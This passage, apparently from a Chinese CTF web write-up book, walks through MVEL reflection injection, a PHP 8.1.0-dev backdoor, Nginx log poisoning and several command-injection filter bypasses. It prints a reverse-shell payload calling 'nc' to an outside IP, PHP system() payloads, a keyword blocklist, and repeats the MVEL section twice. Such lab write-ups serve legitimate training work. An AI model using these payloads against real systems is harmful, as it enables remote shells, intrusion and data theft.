<a id="__codelineno-36-6" name="__codelineno-36-6" href="#__codelineno-36-6"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ResponseObj</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="s">"表达式语法错误"</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">getMessage</span><span class="p">());</span>
<a id="__codelineno-36-7" name="__codelineno-36-7" href="#__codelineno-36-7"></a><span class="p">}</span>
</code></pre></div>
<p>尝试将结果转换为 <code>List&lt;String&gt;</code>（IP 列表）</p>
<p>如果转换失败，返回 580 状态码和错误信息</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="w">    </span><span class="n">allowedIP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="p">)</span><span class="w"> </span><span class="n">result</span><span class="p">;</span>
<a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="w">    </span><span class="n">response</span><span class="p">.</span><span class="na">setStatus</span><span class="p">(</span><span class="mi">580</span><span class="p">);</span>
<a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ResponseObj</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="s">"表达式返回值不是IP列表"</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">getMessage</span><span class="p">());</span>
<a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a><span class="p">}</span>
</code></pre></div>
<p>分析完毕后我们可以利用 Java 的反射机制来 RCE</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="p">{</span>
<a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="nt">"exp"</span><span class="p">:</span><span class="w"> </span><span class="s2">"''.getClass().forName('java.lang.Run'+'time').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Run'+'time').getMethod('getRu'+'ntime').invoke(null),'nc 144.34.162.13 6666 -e /bin/sh'))"</span><span class="p">,</span>
<a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="nt">"limit"</span><span class="p">:</span><span class="w"> </span><span class="s2">"60"</span>
<a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="p">}</span>
</code></pre></div>
<p>下面来解析下这段 payload</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="c1">// ''.getClass(): 获取空字符串的 Class 对象</span>
<a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="err">''</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">forName</span><span class="p">(</span><span class="err">'</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Run</span><span class="sc">'+'</span><span class="n">time</span><span class="err">'</span><span class="p">)</span><span class="w">   </span><span class="c1">// .forName('java.lang.Run'+'time'): 动态加载 java.lang.Runtime 类并返回其 Class 对象</span>
<a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="w">  </span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="err">'</span><span class="n">exec</span><span class="sc">','</span><span class="err">'</span><span class="p">.</span><span class="na">getClass</span><span class="p">())</span><span class="w">  </span><span class="c1">// 获取 Runtime.exec(String) 方法的 Method 对象</span>
<a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="w">  </span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span>
<a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="w">    </span><span class="err">''</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">forName</span><span class="p">(</span><span class="err">'</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Run</span><span class="sc">'+'</span><span class="n">time</span><span class="err">'</span><span class="p">)</span><span class="w">   </span><span class="c1">// 再次获取 Runtime 类</span>
<a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="w">      </span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="err">'</span><span class="n">getRu</span><span class="sc">'+'</span><span class="n">ntime</span><span class="err">'</span><span class="p">)</span><span class="w">   </span><span class="c1">// 获取静态方法 getRuntime()</span>
<a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a><span class="w">      </span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">),</span><span class="w">    </span><span class="c1">// 调用该方法（invoke(null) 因为这是静态方法）,返回 Runtime 类的单例实例</span>
<a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a><span class="w">    </span><span class="err">'</span><span class="n">nc</span><span class="w"> </span><span class="mf">144.34.162.13</span><span class="w"> </span><span class="mi">6666</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">'</span><span class="w">  </span><span class="c1">// 使用前面获取的 exec 方法，在 Runtime 实例上执行命令</span>
<a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a><span class="w">  </span><span class="p">)</span>
</code></pre></div>
<p>发送 payload</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68108a8558cb8da5c8d42ac6.png"></p>
<p>监听端口拿到 flag</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68108a9b58cb8da5c8d42ad5.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-22.md -->
<h3 id="java-rce">Java 反射机制 RCE<a class="headerlink" href="#java-rce" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/681079d158cb8da5c8d3dfa5.png"></p>
<p>打开页面只有这一个功能可用</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/681085c058cb8da5c8d415aa.png"></p>
<p>在 Burp 中发现响应有个 <code>source</code></p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6810860b58cb8da5c8d417c4.png"></p>
<p>访问拿到源码</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6810863858cb8da5c8d41915.png"></p>
<p>使用 <code>@RestController</code> 注解，表示这是一个 Spring MVC 控制器，返回值会自动转换为 JSON 响应</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="nd">@RestController</span>
<a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">MVELTest</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="w">    </span><span class="c1">// 类内容</span>
<a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="p">}</span>
</code></pre></div>
<p>初始化一个 <code>Setting</code> 对象，包含默认的 IP 列表和数字参数 6</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="kd">private</span><span class="w"> </span><span class="n">Setting</span><span class="w"> </span><span class="n">setting</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Setting</span><span class="p">(</span><span class="s">"['115.195.167.159', '115.195.167.159', '164.90.230.201', '174.87.232.68']"</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">);</span>
</code></pre></div>
<p>处理 POST 请求，路径为 <code>/updateSysSetting</code></p>
<p>接收 JSON 格式的 <code>Setting</code> 对象作为请求体</p>
<p>返回 JSON 响应，字符编码为 UTF-8</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="nd">@PostMapping</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"/updateSysSetting"</span><span class="p">,</span><span class="w"> </span><span class="n">produces</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"application/json;charset=UTF-8"</span><span class="p">)</span>
<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="kd">public</span><span class="w"> </span><span class="n">ResponseObj</span><span class="w"> </span><span class="nf">updateSysSetting</span><span class="p">(</span><span class="nd">@RequestBody</span><span class="w"> </span><span class="n">Setting</span><span class="w"> </span><span class="o">[</span><span class="n">ES</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="w">    </span><span class="c1">// 方法实现</span>
<a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a><span class="p">}</span>
</code></pre></div>
<p>使用正则表达式检测传入的表达式是否包含危险关键词（如 Runtime、Process 等）</p>
<p>如果检测到恶意代码，返回 483 状态码和错误信息</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">Pattern</span><span class="p">.</span><span class="na">matches</span><span class="p">(</span><span class="s">""</span><span class="p">{</span><span class="o">?</span><span class="n">i</span><span class="p">}.</span><span class="o">*</span><span class="p">(</span><span class="n">system</span><span class="o">[</span><span class="n">Runtime</span><span class="o">|</span><span class="n">Process</span><span class="o">|</span><span class="n">Thread</span><span class="o">|</span><span class="n">Lookup</span><span class="o">|</span><span class="n">http</span><span class="o">|</span><span class="n">Socket</span><span class="o">|</span><span class="n">restTemplate</span><span class="o">|</span><span class="n">MVEL</span><span class="o">|</span><span class="n">flag</span><span class="o">]</span><span class="p">.</span><span class="o">*</span><span class="s">", [ES].getExp()) {</span>
<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="s">    response.setStatus(483);</span>
<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="s">    return new ResponseObj(false, "</span><span class="n">表达式包含恶意代码</span><span class="s">", "");</span>
<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="s">}</span>
</code></pre></div>
<p>使用 MVEL 引擎执行传入的表达式</p>
<p>捕获并处理执行过程中的异常</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="w">    </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MVEL</span><span class="p">.</span><span class="na">expl</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="na">getExp</span><span class="p">());</span>
<a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="w">    </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="na">toString</span><span class="p">());</span>
<a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="w">    </span><span class="n">response</span><span class="p">.</span><span class="na">setStatus</span><span class="p">(</span><span class="mi">580</span><span class="p">);</span>
<a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ResponseObj</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="s">"表达式语法错误"</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">getMessage</span><span class="p">());</span>
<a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a><span class="p">}</span>
</code></pre></div>
<p>尝试将结果转换为 <code>List&lt;String&gt;</code>（IP 列表）</p>
<p>如果转换失败，返回 580 状态码和错误信息</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="w">    </span><span class="n">allowedIP</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="p">)</span><span class="w"> </span><span class="n">result</span><span class="p">;</span>
<a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="w">    </span><span class="n">response</span><span class="p">.</span><span class="na">setStatus</span><span class="p">(</span><span class="mi">580</span><span class="p">);</span>
<a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ResponseObj</span><span class="p">(</span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="s">"表达式返回值不是IP列表"</span><span class="p">,</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">getMessage</span><span class="p">());</span>
<a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="p">}</span>
</code></pre></div>
<p>分析完毕后我们可以利用 Java 的反射机制来 RCE</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="p">{</span>
<a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="nt">"exp"</span><span class="p">:</span><span class="w"> </span><span class="s2">"''.getClass().forName('java.lang.Run'+'time').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Run'+'time').getMethod('getRu'+'ntime').invoke(null),'nc 144.34.162.13 6666 -e /bin/sh'))"</span><span class="p">,</span>
<a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="nt">"limit"</span><span class="p">:</span><span class="w"> </span><span class="s2">"60"</span>
<a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="p">}</span>
</code></pre></div>
<p>下面来解析下这段 payload</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="c1">// ''.getClass(): 获取空字符串的 Class 对象</span>
<a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="err">''</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">forName</span><span class="p">(</span><span class="err">'</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Run</span><span class="sc">'+'</span><span class="n">time</span><span class="err">'</span><span class="p">)</span><span class="w">   </span><span class="c1">// .forName('java.lang.Run'+'time'): 动态加载 java.lang.Runtime 类并返回其 Class 对象</span>
<a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="w">  </span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="err">'</span><span class="n">exec</span><span class="sc">','</span><span class="err">'</span><span class="p">.</span><span class="na">getClass</span><span class="p">())</span><span class="w">  </span><span class="c1">// 获取 Runtime.exec(String) 方法的 Method 对象</span>
<a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="w">  </span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span>
<a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a><span class="w">    </span><span class="err">''</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">forName</span><span class="p">(</span><span class="err">'</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Run</span><span class="sc">'+'</span><span class="n">time</span><span class="err">'</span><span class="p">)</span><span class="w">   </span><span class="c1">// 再次获取 Runtime 类</span>
<a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a><span class="w">      </span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="err">'</span><span class="n">getRu</span><span class="sc">'+'</span><span class="n">ntime</span><span class="err">'</span><span class="p">)</span><span class="w">   </span><span class="c1">// 获取静态方法 getRuntime()</span>
<a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a><span class="w">      </span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="kc">null</span><span class="p">),</span><span class="w">    </span><span class="c1">// 调用该方法（invoke(null) 因为这是静态方法）,返回 Runtime 类的单例实例</span>
<a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a><span class="w">    </span><span class="err">'</span><span class="n">nc</span><span class="w"> </span><span class="mf">144.34.162.13</span><span class="w"> </span><span class="mi">6666</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">'</span><span class="w">  </span><span class="c1">// 使用前面获取的 exec 方法，在 Runtime 实例上执行命令</span>
<a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a><span class="w">  </span><span class="p">)</span>
</code></pre></div>
<p>发送 payload</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68108a8558cb8da5c8d42ac6.png"></p>
<p>监听端口拿到 flag</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68108a9b58cb8da5c8d42ad5.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-23.md -->
<h3 id="php-810-dev-rce">PHP 8.1.0 dev RCE<a class="headerlink" href="#php-810-dev-rce" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/6816446758cb8da5c8d9febd.png"></p>
<p>打开页面</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6816452e58cb8da5c8d9feed.png"></p>
<p>抓包看拿到了泄露的 PHP 版本</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/681649af58cb8da5c8d9ffc9.png"></p>
<p><a href="https://amsghimire.medium.com/php-8-1-0-dev-backdoor-cb224e7f5914">网上找 nday 复现</a></p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68164a6c58cb8da5c8d9ffe5.png"></p>
<p>成功拿到 flag</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68164ed958cb8da5c8da0185.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-24.md -->
<h3 id="nl">nl /* 绕过长度限制<a class="headerlink" href="#nl" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/6838453258cb8da5c81a5f88.png"></p>
<p>限制了我们长度在 5 以为</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6838456958cb8da5c81a5fa9.png"></p>
<p>发现 flag 在根目录下</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="o">?</span><span class="nx">com</span><span class="o">=</span><span class="nx">ls</span><span class="o">%</span><span class="mf">20</span><span class="o">/</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/683845b758cb8da5c81a5fb9.png"></p>
<p>使用 <code>nl</code> 查看，<code>nl</code> 用于显示文本并输出行号</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="o">?</span><span class="nx">com</span><span class="o">=</span><span class="nx">nl</span><span class="o">%</span><span class="mf">20</span><span class="o">/*</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/6838458958cb8da5c81a5fb0.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-25.md -->
<h3 id="nginx-rce">Nginx 日志 RCE<a class="headerlink" href="#nginx-rce" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/68393d1c58cb8da5c81c5769.png"></p>
<p>打开网页给出了源码</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68393d3d58cb8da5c81c587a.png"></p>
<p>文件包含是没有任何过滤的，但是没有 <code>/flag</code> 文件</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68393d5558cb8da5c81c5980.png"></p>
<p>分析架构为 Nginx 服务器</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68393dd058cb8da5c81c5d82.png"></p>
<p>尝试访问日志文件 <code>/var/log/nginx/error.log</code> 和 <code>/var/log/nginx/access.log</code></p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68393ec158cb8da5c81c625b.png"></p>
<p>发现 <code>access.log</code> 被设置为了 UA 头</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/68393eda58cb8da5c81c62c7.png"></p>
<p>于是我们可以改 UA 头为 PHP 代码</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>User-Agent: &lt;?php echo system('ls');?&gt;
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/6839434158cb8da5c81c7a54.png"></p>
<p>再查看 <code>flag.php</code></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>User-Agent: &lt;?php system('cat flag.php');?&gt;
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/6839447e58cb8da5c81c7fc8.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-26.md -->
<h3 id="data">data 伪协议去掉双斜杠绕过<a class="headerlink" href="#data" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/683d81d058cb8da5c82526cb.png"></p>
<p>打开网页给出了源码</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="cp">&lt;?php</span>
<a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>
<a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])){</span>
<a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>        <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
<a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a><span class="p">}</span>
<a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a><span class="c1">// 假如我增加了过滤，你又该如何应对呢？</span>
<a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a><span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/php:\/\/|file:\/\/|flag|http:\/\/|log|phar:\/\/|data:\/\//i'</span><span class="p">,</span> <span class="nv">$file</span><span class="p">)){</span>
<a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a>        <span class="k">echo</span> <span class="s1">'No No No !'</span><span class="p">;</span>
<a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a><span class="p">}</span>
<a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a><span class="k">else</span><span class="p">{</span>
<a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a>        <span class="k">include</span> <span class="nv">$file</span><span class="p">;</span>
<a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a><span class="p">}</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/683d81f258cb8da5c82526e6.png"></p>
<p>这里的正则只匹配了 <code>data://</code>，没有过滤整个 <code>data</code> 伪协议，所以我们去掉 <code>//</code> 即可绕过</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="x">?file=data:text/plain,</span><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">'cat /fl\ag'</span><span class="p">);</span><span class="cp">?&gt;</span>
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/683d82ad58cb8da5c8252740.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-27.md -->
<h3 id="_5">关键字+双引号绕过<a class="headerlink" href="#_5" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/683daaba58cb8da5c8259042.png"></p>
<p>默认给出了 <code>.</code>，点击浏览看输出格式应该是执行了 <code>ls</code></p>
<p><img alt="" src="https://pic1.imgdb.cn/item/683daad958cb8da5c825904c.png"></p>
<p>先 fuzz 测试</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6848d9fc58cb8da5c8426c88.png"></p>
<p>发现双引号没有过滤，那么可以用双引号绕过</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>ca<span class="s2">""</span><span class="nv">t</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>cat
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/6848dbc958cb8da5c8428bf9.png"></p>
<p>后续参考下一节 TAB</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>&amp;   ca""t   /fl""ag
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/6848dcdd58cb8da5c842a3cd.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-28.md -->
<h3 id="tab">Tab 键代替空格绕过<a class="headerlink" href="#tab" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/683daaba58cb8da5c8259042.png"></p>
<p>默认给出了 <code>.</code>，点击浏览看输出格式应该是执行了 <code>ls</code></p>
<p><img alt="" src="https://pic1.imgdb.cn/item/683daad958cb8da5c825904c.png"></p>
<p>先 fuzz 测试</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/6848d9fc58cb8da5c8426c88.png"></p>
<p>发现双引号没有过滤，那么可以用双引号绕过</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>ca<span class="s2">""</span><span class="nv">t</span><span class="w"> </span><span class="o">==</span><span class="w"> </span>cat
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/6848dbc958cb8da5c8428bf9.png"></p>
<p>但是空格被过滤了，可以使用 TAB 键代替（需要自己找个文本编辑里按出来然后复制粘贴）</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>&amp;   ca""t   /fl""ag
</code></pre></div>
<p><img alt="" src="https://pic1.imgdb.cn/item/6848dcdd58cb8da5c842a3cd.png"></p>
<!-- Imported from D:\\Book\\Web\\Chapter6\6-29.md -->
<h3 id="base64">&lt; 加 |Base64 绕过空格<a class="headerlink" href="#base64" title="Permanent link">¶</a></h3>
<p><img alt="" src="https://pic1.imgdb.cn/item/687cb38d58cb8da5c8c86f8a.png"></p>
<p>输入 <code>127.0.0.1&amp;ls</code> 看到 flag 文件</p>
<p><img alt="" src="https://pic1.imgdb.cn/item/687cb3a958cb8da5c8c86f95.png"></p>
<p>利用重定向配合 Base64 拿到 flag</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="m">127</span>.0.0.1<span class="p">&amp;</span>cat&lt;flag_94851679315785.php<span class="p">|</span>base64
</code></pre></div>
<p>`<img alt="" src="https://pic1.imgdb.cn/item/687cb42058cb8da5c8c86fc9.png"></p>
